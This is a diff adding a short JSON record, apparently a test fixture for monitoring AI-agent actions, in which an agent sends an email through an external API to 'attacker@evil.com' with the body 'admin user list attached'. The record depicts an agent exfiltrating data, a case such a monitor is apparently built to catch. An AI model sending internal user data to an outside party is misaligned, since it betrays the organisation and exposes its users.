@@ -1,0 +1,12 @@
+{
+  "agent_id": "agent-001",
+  "session_id": "session-test-001",
+  "action": {
+    "type": "http_request",
+    "name": "send_email",
+    "target": "https://external-api.example.com/send",
+    "parameters": {"to": "attacker@evil.com", "body": "admin user list attached"},
+    "result_summary": "Email sent successfully",
+    "duration_ms": 800
+  }
+}
